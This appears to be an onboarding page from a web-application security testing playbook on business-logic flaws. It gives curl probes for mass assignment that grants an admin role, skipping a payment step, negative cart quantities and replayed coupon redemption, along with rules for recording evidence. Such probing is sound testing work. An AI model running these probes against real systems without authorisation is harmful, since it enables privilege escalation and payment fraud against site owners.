# Onboarding — the five-minute read before the first probe

The skill in the order a new session should consume it.

## 1. What this class is

The implemented state machine permits an edge the imagined workflow
doesn't. Concretely: a field the form doesn't send binds anyway; a step
the flow requires can be skipped; a one-time action replays; a value the
checker bounds is transformed before use.

## 2. The four probes that start every engagement

```bash
# mass assignment — the extra field
curl -X POST $BASE/register -H "Content-Type: application/json" \
  -d '{"u":"p","p":"x","role":"admin"}'
curl -b "$JAR" $BASE/api/user/p | jq .role        # user=falsifier

# workflow skip — the bare terminal
curl -i -b "$JAR" -X POST $BASE/confirm -d 'orderId=1'
curl -b "$JAR" $BASE/order/1   # confirmed+unpaid=confirm

# numeric boundary — the sign value
curl -b "$JAR" -X POST $BASE/cart -d 'productId=2&quantity=-1'
curl -b "$JAR" $BASE/cart      # total<0=confirm

# replay — the doubled action
curl -b "$JAR" -X POST $BASE/redeem -d 'code=X'   # ×2
curl -b "$JAR" $BASE/balance   # +50 twice=confirm
```

## 3. The falsifier discipline

Every probe ships with its kill shot — run it early, record it when it
fires, move to the NEXT mechanism (not the next spelling). `role:user`
on read-back is an allowlist — the whole mechanism cell is dead on that
endpoint.

## 4. The evidence rule

Baseline pair + verbatim forbidden state + `post-probe` with
`--response` attached. The echo is not the store — read-back decides.

## 5. The card

Pachinko Revisited is the verified anchor: a checked index transformed
before use. The question it teaches — *is the value the checker bounds
the same value the sink uses?* — is the whole class in one sentence.

## 6. Where to go next

- mechanism known → its module in the README's mechanism table;
- shape unclear → `detection-workflows.md`;
- stuck → `troubleshoot.md`, then `decide.py` — never a sixth spelling.
